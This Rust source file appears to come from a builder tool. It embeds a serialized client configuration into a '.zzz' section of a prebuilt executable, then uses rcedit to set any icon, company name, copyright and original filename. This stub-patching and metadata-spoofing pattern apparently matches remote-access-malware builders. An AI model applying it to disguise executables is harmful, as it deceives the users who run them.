use crate::handlers::AssemblyInfo;
use serde::Serialize;
use std::vec;
use std::fs;

use object::{ Object, ObjectSection };
use std::fs::File;
use std::io::Write;
use rmp_serde::Serializer;
use std::process::Command;
use common::ClientConfig;

pub async fn apply_config(config: &ClientConfig) -> Result<(), String> {
    let bin_data = fs::read("target/debug/client.exe").unwrap();
    let file = object::File::parse(&*bin_data).unwrap();

    let mut output_data = bin_data.clone();

    let mut buffer: Vec<u8> = Vec::new();

    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();

    let mut new_data = vec![0u8; 1024];

    for (i, byte) in buffer.iter().enumerate() {
        new_data[i] = *byte;
    }

    if let Some(section) = file.section_by_name(".zzz") {
        let offset = section.file_range().unwrap().0 as usize;
        let size = section.size() as usize;

        output_data[offset..offset + size].copy_from_slice(&new_data);
    }

    let mut file = File::create("target/debug/Client_built.exe").unwrap();
    let _ = file.write_all(&output_data);
    drop(file);

    Ok(())
}

pub async fn apply_rcedit(assembly_info: &AssemblyInfo, enable_icon: bool, icon_path: &str) -> Result<(), String> {
    let mut cmd = Command::new("target/rcedit.exe");

    cmd.arg("target/debug/Client_built.exe");

    if enable_icon && icon_path != "" {
        cmd.arg("--set-icon").arg(icon_path);
    }

    if assembly_info.assembly_name != "" {
        cmd.arg("--set-version-string").arg("ProductName").arg(&assembly_info.assembly_name);
    }

    if assembly_info.assembly_description != "" {
        cmd.arg("--set-version-string").arg("FileDescription").arg(&assembly_info.assembly_description);
    }

    if assembly_info.assembly_company != "" {
        cmd.arg("--set-version-string").arg("CompanyName").arg(&assembly_info.assembly_company);
    }
    
    if assembly_info.assembly_copyright != "" {
        cmd.arg("--set-version-string").arg("LegalCopyright").arg(&assembly_info.assembly_copyright);
    }

    if assembly_info.assembly_trademarks != "" {
        cmd.arg("--set-version-string").arg("LegalTrademarks").arg(&assembly_info.assembly_trademarks);
    }

    if assembly_info.assembly_original_filename != "" {
        cmd.arg("--set-version-string").arg("OriginalFilename").arg(&assembly_info.assembly_original_filename);
    }

    if assembly_info.assembly_file_version != "" {
        cmd.arg("--set-file-version").arg(&assembly_info.assembly_file_version);
    }

    let status = cmd.status().unwrap();

    if status.success() {
        Ok(())
    } else {
        Err("Failed to apply rcedit".to_string())
    }
}

pub async fn open_explorer(path: &str) -> Result<(), String> {
    let written_file_path = std::fs::canonicalize(path)
    .map_err(|e| format!("Failed to get full path: {}", e))?
    .to_string_lossy()
    .replace(r"\\?\", "");

    let _ = Command::new("explorer")
    .arg("/select,")
    .arg(&written_file_path)
    .status()
    .map_err(|e| format!("Failed to open explorer: {}", e));

    Ok(())
}
